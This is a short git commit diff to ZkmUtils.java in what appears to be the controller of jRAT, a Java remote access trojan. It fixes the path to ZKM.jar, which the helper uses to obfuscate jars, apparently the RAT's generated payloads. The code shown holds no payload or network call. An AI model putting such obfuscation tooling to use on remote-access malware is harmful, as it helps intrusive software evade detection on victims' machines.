4805dee90401368d9fa6f4bd68ea69e265803081
redpois0n <red@cmail.nu>
2014-01-03 21:55:27 +0100

    ZkmUtils fixed missing ZKM.jar

--- Controller/src/pro/jrat/client/utils/ZkmUtils.java
+++ Controller/src/pro/jrat/client/utils/ZkmUtils.java
@@ -3,12 +3,15 @@ package pro.jrat.client.utils;
 import java.io.File;
 import java.util.jar.JarFile;
 
-import com.redpois0n.zkmlib.JarUtils;
+import pro.jrat.api.utils.JarUtils;
+
+import com.redpois0n.zkmlib.Main;
 import com.redpois0n.zkmlib.Obfuscator;
 
 public class ZkmUtils {
 	
 	public static void obfuscate(File input, File output) throws Exception {
+		Main.zkmJar = new File("files/zkm/ZKM.jar");
 		Obfuscator obfuscator = new Obfuscator(input, output, JarUtils.getMainClass(new JarFile(input)));
 		obfuscator.obfuscate();
 	}
